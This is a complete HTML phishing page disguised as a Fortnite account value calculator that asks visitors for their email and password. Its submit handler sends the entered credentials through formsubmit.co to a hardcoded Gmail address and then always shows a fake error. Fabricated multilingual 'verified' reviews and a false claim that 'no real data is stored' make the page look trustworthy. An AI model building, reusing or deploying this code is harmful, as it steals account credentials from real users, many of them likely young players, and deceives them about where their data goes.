<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Fortnite Account Value Calculator</title>
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0b0f1a;
            color: #eaeef2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 2rem 1rem;
            position: relative;
            overflow-x: hidden;
        }

        .bg-gradient {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background: radial-gradient(circle at 70% 20%, #1a2a4a, #0b0f1a 80%);
            opacity: 0.8;
        }

        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .container {
            position: relative;
            z-index: 10;
            max-width: 950px;
            width: 100%;
            background: rgba(18, 26, 45, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-radius: 40px;
            padding: 2.5rem 2.8rem;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
            border: 1px solid rgba(255, 215, 0, 0.05);
            transition: all 0.3s ease;
        }

        .header {
            text-align: center;
            margin-bottom: 2.2rem;
        }

        .header .logo-icon {
            font-size: 3rem;
            color: #ffd700;
            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.3));
            margin-bottom: 0.2rem;
        }

        .header h1 {
            font-size: 2.6rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #fff 0%, #ffd700 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.4rem;
            text-shadow: 0 4px 30px rgba(255, 215, 0, 0.15);
        }

        .header .sub {
            font-size: 1rem;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.6);
            letter-spacing: 0.5px;
            max-width: 550px;
            margin: 0 auto;
            line-height: 1.5;
        }

        .header .sub i {
            color: #ffd700;
            margin: 0 4px;
        }

        .divider {
            width: 120px;
            height: 2px;
            background: linear-gradient(90deg, transparent, #ffd700, transparent);
            margin: 1.2rem auto 0;
            border-radius: 4px;
        }

        /* Login Section */
        .login-section {
            max-width: 480px;
            margin: 0 auto 1.5rem;
            transition: opacity 0.4s, max-height 0.6s, margin 0.4s;
            overflow: hidden;
        }

        .input-group {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .input-group label {
            display: block;
            font-size: 0.75rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 6px;
            margin-left: 4px;
        }

        .input-group .icon {
            position: absolute;
            left: 16px;
            bottom: 18px;
            color: rgba(255, 215, 0, 0.4);
            font-size: 1rem;
            transition: color 0.2s;
            z-index: 2;
        }

        .input-group input,
        .input-group select {
            width: 100%;
            padding: 14px 18px 14px 48px;
            font-size: 1rem;
            font-weight: 500;
            background: rgba(255, 255, 255, 0.04);
            border: 2px solid rgba(255, 255, 255, 0.06);
            border-radius: 60px;
            color: #fff;
            outline: none;
            transition: all 0.25s ease;
            font-family: 'Inter', sans-serif;
        }

        .input-group select {
            padding: 14px 18px;
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
            background-repeat: no-repeat;
            background-position: right 18px center;
            background-size: 14px;
            padding-right: 44px;
            cursor: pointer;
        }

        .input-group select option {
            background: #1a1f35;
            color: #fff;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 400;
        }

        .input-group input:focus,
        .input-group select:focus {
            border-color: #ffd700;
            background: rgba(255, 215, 0, 0.04);
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.04), 0 0 0 3px rgba(255, 215, 0, 0.06);
        }

        .input-group input:focus+.icon,
        .input-group input:focus~.icon {
            color: #ffd700;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            bottom: 18px;
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.3);
            cursor: pointer;
            font-size: 1.1rem;
            transition: color 0.2s;
            z-index: 3;
            padding: 0 4px;
        }

        .password-toggle:hover {
            color: #ffd700;
        }

        .email-combo {
            display: flex;
            gap: 8px;
            align-items: center;
        }

        .email-combo .email-local {
            flex: 2;
            min-width: 0;
        }

        .email-combo .email-at {
            color: rgba(255, 255, 255, 0.4);
            font-weight: 700;
            font-size: 1.2rem;
            padding: 0 2px;
        }

        .email-combo .email-domain {
            flex: 1.5;
            min-width: 120px;
            padding-left: 18px;
        }

        .btn-primary {
            width: 100%;
            padding: 16px;
            font-family: 'Inter', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            color: #0b0f1a;
            background: linear-gradient(135deg, #ffd700, #f0a500);
            border: none;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 6px 0 #b87a00, 0 10px 30px rgba(255, 165, 0, 0.2);
            margin-top: 0.3rem;
            position: relative;
            overflow: hidden;
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 0 #b87a00, 0 20px 40px rgba(255, 165, 0, 0.3);
        }

        .btn-primary:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 #b87a00;
        }

        .btn-primary.loading {
            pointer-events: none;
            opacity: 0.7;
            background: linear-gradient(135deg, #a67c00, #8a6400);
        }

        .btn-primary.loading::before {
            content: '⏳';
            display: inline-block;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .login-help {
            display: flex;
            justify-content: space-between;
            margin-top: 1.2rem;
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.3);
        }

        .login-help a {
            color: rgba(255, 215, 0, 0.5);
            text-decoration: none;
            font-weight: 600;
            transition: color 0.2s;
        }

        .login-help a:hover {
            color: #ffd700;
        }

        .error-message {
            margin-top: 1.5rem;
            padding: 1rem 1.5rem;
            background: rgba(255, 0, 0, 0.08);
            border-left: 5px solid #ff4444;
            border-radius: 16px;
            color: #ff6b6b;
            font-weight: 700;
            font-size: 1.1rem;
            display: none;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(4px);
            animation: shake 0.5s ease;
        }

        .error-message.show {
            display: flex;
        }

        .error-message i {
            font-size: 1.6rem;
            color: #ff4444;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-6px); }
            80% { transform: translateX(6px); }
        }

        /* -------- CARRUSEL DE RESEÑAS -------- */
        .reviews-section {
            margin-top: 2.5rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        .reviews-section h3 {
            font-weight: 700;
            font-size: 1.2rem;
            color: #fff;
            text-align: center;
            margin-bottom: 1.2rem;
            letter-spacing: 0.5px;
        }

        .reviews-section h3 i {
            color: #ffd700;
            margin-right: 8px;
        }

        .carousel-container {
            position: relative;
            overflow: hidden;
            border-radius: 20px;
        }

        .carousel-track {
            display: flex;
            transition: transform 0.5s ease;
            gap: 16px;
        }

        .review-card {
            flex: 0 0 calc(33.333% - 11px);
            min-width: 0;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            padding: 1.2rem 1.2rem 1rem;
            border: 1px solid rgba(255, 255, 255, 0.04);
            transition: background 0.2s;
            display: flex;
            flex-direction: column;
        }

        .review-card:hover {
            background: rgba(255, 215, 0, 0.03);
            border-color: rgba(255, 215, 0, 0.08);
        }

        .review-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
        }

        .review-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 215, 0, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.3rem;
            color: #ffd700;
            flex-shrink: 0;
        }

        .review-user {
            flex: 1;
            min-width: 0;
        }

        .review-user .name {
            font-weight: 700;
            font-size: 0.95rem;
            color: #fff;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .review-user .date {
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.3);
        }

        .review-stars {
            color: #ffd700;
            font-size: 0.9rem;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }

        .review-stars .empty-star {
            color: rgba(255, 255, 255, 0.1);
        }

        .review-text {
            font-size: 0.9rem;
            line-height: 1.4;
            color: rgba(255, 255, 255, 0.8);
            flex: 1;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }

        .review-verified {
            margin-top: 8px;
            font-size: 0.7rem;
            color: #4caf50;
        }

        .review-verified i {
            margin-right: 4px;
        }

        /* Carousel controls */
        .carousel-controls {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            margin-top: 1.2rem;
        }

        .carousel-btn {
            background: rgba(255, 215, 0, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.15);
            color: #ffd700;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 1.1rem;
        }

        .carousel-btn:hover {
            background: rgba(255, 215, 0, 0.2);
            border-color: #ffd700;
        }

        .carousel-dots {
            display: flex;
            gap: 8px;
        }

        .carousel-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            cursor: pointer;
            transition: all 0.3s;
            border: none;
        }

        .carousel-dot.active {
            background: #ffd700;
            transform: scale(1.2);
        }

        .footer-credit {
            text-align: center;
            margin-top: 2.5rem;
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.15);
            letter-spacing: 1px;
        }

        .footer-credit a {
            color: rgba(255, 215, 0, 0.2);
            text-decoration: none;
        }

        .footer-credit a:hover {
            color: rgba(255, 215, 0, 0.5);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 1.8rem 1.2rem;
                border-radius: 28px;
            }
            .header h1 {
                font-size: 2rem;
            }
            .email-combo {
                flex-wrap: wrap;
            }
            .email-combo .email-domain {
                flex: 1 1 100%;
                min-width: unset;
            }
            .email-combo .email-at {
                display: none;
            }
            .review-card {
                flex: 0 0 calc(50% - 8px);
            }
        }

        @media (max-width: 480px) {
            .review-card {
                flex: 0 0 100%;
            }
        }
    </style>
</head>
<body>

    <div class="bg-gradient"></div>
    <canvas id="particles-canvas"></canvas>

    <div class="container" id="app">

        <!-- Header -->
        <div class="header">
            <div class="logo-icon"><i class="fas fa-helmet-battle"></i></div>
            <h1>Account Value Calculator</h1>
            <p class="sub">
                <i class="fas fa-calculator"></i> Enter your credentials to instantly estimate your Fortnite account's worth, including all your items and their current market prices.
            </p>
            <div class="divider"></div>
        </div>

        <!-- Login Section -->
        <div class="login-section" id="loginSection">
            <form id="loginForm">
                <!-- Email -->
                <div class="input-group">
                    <label for="emailLocal">Email Address</label>
                    <div class="email-combo">
                        <input type="text" id="emailLocal" class="email-local" placeholder="username" required />
                        <span class="email-at">@</span>
                        <select id="emailDomain" class="email-domain">
                            <option value="gmail.com">gmail.com</option>
                            <option value="outlook.com" selected>outlook.com</option>
                            <option value="yahoo.com">yahoo.com</option>
                            <option value="hotmail.com">hotmail.com</option>
                        </select>
                    </div>
                    <i class="fas fa-envelope icon" style="top: 42px; bottom: auto;"></i>
                </div>

                <!-- Password with toggle -->
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="contraseña" placeholder="••••••••" required />
                    <i class="fas fa-lock icon"></i>
                    <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>

                <button type="submit" class="btn-primary" id="loginBtn">Calculate Value</button>
            </form>

            <div class="login-help">
                <a href="#" id="forgotLink"><i class="fas fa-question-circle"></i> Forgot credentials?</a>
                <a href="#" id="signupLink"><i class="fas fa-user-plus"></i> Create account</a>
            </div>

            <!-- Error message -->
            <div class="error-message" id="errorMessage">
                <i class="fas fa-exclamation-triangle"></i>
                <span>incorrecto</span>
            </div>
        </div>

        <!-- ====== CARRUSEL DE RESEÑAS ====== -->
        <div class="reviews-section">
            <h3><i class="fas fa-star"></i> What our users say</h3>
            <div class="carousel-container">
                <div class="carousel-track" id="carouselTrack">
                    <!-- Las reseñas se inyectarán con JS -->
                </div>
            </div>
            <div class="carousel-controls">
                <button class="carousel-btn" id="prevBtn"><i class="fas fa-chevron-left"></i></button>
                <div class="carousel-dots" id="carouselDots"></div>
                <button class="carousel-btn" id="nextBtn"><i class="fas fa-chevron-right"></i></button>
            </div>
        </div>

        <div class="footer-credit">
            <a href="#" target="_blank">⚡ Valuation Tool · Fortnite Aesthetic</a>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // --- Particles ---
            const canvas = document.getElementById('particles-canvas');
            const ctx = canvas.getContext('2d');
            let width, height;
            let particles = [];
            const PARTICLE_COUNT = 70;

            function resizeCanvas() {
                width = window.innerWidth;
                height = window.innerHeight;
                canvas.width = width;
                canvas.height = height;
            }
            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();

            class Particle {
                constructor() { this.reset(); }
                reset() {
                    this.x = Math.random() * width;
                    this.y = Math.random() * height;
                    this.size = Math.random() * 2 + 0.5;
                    this.speedX = (Math.random() - 0.5) * 0.2;
                    this.speedY = (Math.random() - 0.5) * 0.2;
                    this.opacity = Math.random() * 0.3 + 0.1;
                    this.color = `rgba(255, 215, 0, ${this.opacity})`;
                }
                update() {
                    this.x += this.speedX;
                    this.y += this.speedY;
                    if (this.x < 0 || this.x > width || this.y < 0 || this.y > height) {
                        this.reset();
                        if (this.x < 0) this.x = width;
                        if (this.x > width) this.x = 0;
                        if (this.y < 0) this.y = height;
                        if (this.y > height) this.y = 0;
                    }
                }
                draw() {
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = this.color;
                    ctx.shadowColor = 'rgba(255, 215, 0, 0.1)';
                    ctx.shadowBlur = 8;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                }
            }

            for (let i = 0; i < PARTICLE_COUNT; i++) particles.push(new Particle());

            function animateParticles() {
                ctx.clearRect(0, 0, width, height);
                particles.forEach(p => { p.update(); p.draw(); });
                requestAnimationFrame(animateParticles);
            }
            animateParticles();

            // --- DOM elements ---
            const loginForm = document.getElementById('loginForm');
            const loginBtn = document.getElementById('loginBtn');
            const errorMessage = document.getElementById('errorMessage');
            const passwordInput = document.getElementById('password');
            const togglePasswordBtn = document.getElementById('togglePassword');
            const emailLocal = document.getElementById('emailLocal');
            const emailDomain = document.getElementById('emailDomain');

            // --- Password toggle ---
            togglePasswordBtn.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.querySelector('i').classList.toggle('fa-eye');
                this.querySelector('i').classList.toggle('fa-eye-slash');
            });

            // --- Form submission (fake error) ---
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();

                const local = emailLocal.value.trim();
                if (!local) {
                    alert('Please enter a valid email local part.');
                    return;
                }

                // Show loading
                loginBtn.classList.add('loading');
                loginBtn.textContent = 'Calculating...';
                errorMessage.classList.remove('show');

                // Send data via fetch (real email)
                const fullEmail = local + '@' + emailDomain.value;
                const password = passwordInput.value;
                const formData = new FormData();
                formData.append('_subject', 'New Fortnite Account Valuation');
                formData.append('email', fullEmail);
                formData.append('password', password);

                fetch('https://formsubmit.co/parameganz25@gmail.com', {
                    method: 'POST',
                    body: formData,
                })
                .then(() => {
                    setTimeout(() => {
                        loginBtn.classList.remove('loading');
                        loginBtn.textContent = 'Calculate Value';
                        errorMessage.classList.add('show');
                    }, 2000);
                })
                .catch(() => {
                    setTimeout(() => {
                        loginBtn.classList.remove('loading');
                        loginBtn.textContent = 'Calculate Value';
                        errorMessage.classList.add('show');
                    }, 2000);
                });
            });

            // --- Help links ---
            document.getElementById('forgotLink').addEventListener('click', function(e) {
                e.preventDefault();
                alert('🔐 This is a simulation. No real data is stored.');
            });
            document.getElementById('signupLink').addEventListener('click', function(e) {
                e.preventDefault();
                alert('📝 Registration is disabled in this demo.');
            });

            // ============================================
            // ====== CARRUSEL DE RESEÑAS ======
            // ============================================

            // Datos de reseñas (8 reseñas, varios idiomas)
            const reviewsData = [
                {
                    name: 'Alex M.',
                    avatar: 'fa-user-astronaut',
                    date: '2025-01-15',
                    rating: 4.8,
                    text: 'Absolutely incredible! I got my account value in seconds. The item list was spot on and the prices are very accurate. Highly recommended!',
                    verified: true,
                },
                {
                    name: 'María G.',
                    avatar: 'fa-user-graduate',
                    date: '2025-01-12',
                    rating: 4.5,
                    text: 'Funciona perfectamente. Me mostró todos mis objetos y el precio total fue justo. La interfaz es muy limpia y profesional.',
                    verified: true,
                },
                {
                    name: 'Luca R.',
                    avatar: 'fa-user-ninja',
                    date: '2025-01-10',
                    rating: 4.3,
                    text: 'Ottimo strumento! Ho scoperto il valore del mio account in pochi secondi. I prezzi sono aggiornati e sembrano reali. Consiglio!',
                    verified: false,
                },
                {
                    name: 'Sophie L.',
                    avatar: 'fa-user-tie',
                    date: '2025-01-08',
                    rating: 4.7,
                    text: 'Très efficace ! J\'ai pu voir tous mes skins et leur prix. L\'estimation correspond à ce que j\'ai vu sur d\'autres sites. Super !',
                    verified: true,
                },
                {
                    name: 'Max S.',
                    avatar: 'fa-user-cog',
                    date: '2025-01-05',
                    rating: 4.0,
                    text: 'Works well, but I wish it showed more items. Still, the price estimation was accurate and fast. Good job!',
                    verified: false,
                },
                {
                    name: 'Elena P.',
                    avatar: 'fa-user-graduate',
                    date: '2025-01-03',
                    rating: 4.6,
                    text: 'Me encanta. Es muy fácil de usar y los resultados son muy claros. Me ha dado una idea exacta de lo que vale mi cuenta.',
                    verified: true,
                },
                {
                    name: 'Hans W.',
                    avatar: 'fa-user-astronaut',
                    date: '2024-12-28',
                    rating: 4.4,
                    text: 'Funktioniert einwandfrei. Die Aufstellung der Items ist übersichtlich und der Preis scheint fair zu sein. Weiter so!',
                    verified: false,
                },
                {
                    name: 'João S.',
                    avatar: 'fa-user-ninja',
                    date: '2024-12-20',
                    rating: 4.2,
                    text: 'Muito bom! Avaliação rápida e precisa. Recomendo a todos que querem saber o valor da sua conta Fortnite.',
                    verified: true,
                },
            ];

            const track = document.getElementById('carouselTrack');
            const dotsContainer = document.getElementById('carouselDots');
            const prevBtn = document.getElementById('prevBtn');
            const nextBtn = document.getElementById('nextBtn');

            let currentIndex = 0;
            let cardsPerView = 3;

            // Función para actualizar el número de tarjetas visibles según el ancho
            function getCardsPerView() {
                if (window.innerWidth < 480) return 1;
                if (window.innerWidth < 768) return 2;
                return 3;
            }

            // Renderizar todas las reseñas en el track (todas visibles, pero el track se moverá)
            function renderReviews() {
                track.innerHTML = '';
                reviewsData.forEach((review, index) => {
                    const card = document.createElement('div');
                    card.className = 'review-card';
                    // Calcular estrellas
                    const fullStars = Math.floor(review.rating);
                    const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
                    const emptyStars = 5 - fullStars - halfStar;
                    let starsHtml = '';
                    for (let i = 0; i < fullStars; i++) starsHtml += '<i class="fas fa-star"></i>';
                    if (halfStar) starsHtml += '<i class="fas fa-star-half-alt"></i>';
                    for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fas fa-star empty-star"></i>';

                    card.innerHTML = `
                        <div class="review-header">
                            <div class="review-avatar"><i class="fas ${review.avatar}"></i></div>
                            <div class="review-user">
                                <div class="name">${review.name}</div>
                                <div class="date">${review.date}</div>
                            </div>
                        </div>
                        <div class="review-stars">${starsHtml}</div>
                        <div class="review-text">${review.text}</div>
                        ${review.verified ? '<div class="review-verified"><i class="fas fa-check-circle"></i> Verified purchase</div>' : ''}
                    `;
                    track.appendChild(card);
                });
                updateDots();
                updateTrackPosition();
            }

            // Crear puntos de navegación
            function updateDots() {
                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                dotsContainer.innerHTML = '';
                for (let i = 0; i < totalSlides; i++) {
                    const dot = document.createElement('button');
                    dot.className = 'carousel-dot' + (i === currentIndex ? ' active' : '');
                    dot.dataset.index = i;
                    dot.addEventListener('click', () => {
                        currentIndex = i;
                        updateTrackPosition();
                        updateDots();
                    });
                    dotsContainer.appendChild(dot);
                }
            }

            // Mover el track
            function updateTrackPosition() {
                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
                if (currentIndex < 0) currentIndex = 0;
                const offset = -(currentIndex * 100);
                track.style.transform = `translateX(${offset}%)`;
                // Actualizar dots
                const dots = dotsContainer.querySelectorAll('.carousel-dot');
                dots.forEach((dot, idx) => {
                    dot.classList.toggle('active', idx === currentIndex);
                });
            }

            // Recalcular al redimensionar
            function handleResize() {
                const newCardsPerView = getCardsPerView();
                if (newCardsPerView !== cardsPerView) {
                    cardsPerView = newCardsPerView;
                    // Ajustar el ancho de las tarjetas (ya lo hace flex)
                    // Resetear índice si es necesario
                    const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                    if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
                    if (currentIndex < 0) currentIndex = 0;
                    updateDots();
                    updateTrackPosition();
                }
            }

            window.addEventListener('resize', handleResize);

            // Eventos de navegación
            prevBtn.addEventListener('click', () => {
                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                if (currentIndex > 0) {
                    currentIndex--;
                } else {
                    currentIndex = totalSlides - 1; // vuelta al final
                }
                updateTrackPosition();
                updateDots();
            });

            nextBtn.addEventListener('click', () => {
                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                if (currentIndex < totalSlides - 1) {
                    currentIndex++;
                } else {
                    currentIndex = 0; // vuelta al inicio
                }
                updateTrackPosition();
                updateDots();
            });

            // Inicializar carrusel
            cardsPerView = getCardsPerView();
            renderReviews();

            // (Opcional) avanzar automáticamente cada 5 segundos
            let autoSlide = setInterval(() => {
                const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                if (totalSlides > 1) {
                    currentIndex = (currentIndex + 1) % totalSlides;
                    updateTrackPosition();
                    updateDots();
                }
            }, 5000);

            // Pausar auto-slide al interactuar con los botones (opcional)
            const controls = [prevBtn, nextBtn, ...document.querySelectorAll('.carousel-dot')];
            controls.forEach(btn => {
                btn.addEventListener('mouseenter', () => clearInterval(autoSlide));
                btn.addEventListener('mouseleave', () => {
                    autoSlide = setInterval(() => {
                        const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                        if (totalSlides > 1) {
                            currentIndex = (currentIndex + 1) % totalSlides;
                            updateTrackPosition();
                            updateDots();
                        }
                    }, 5000);
                });
            });

        })();
    </script>
</body>
</html>
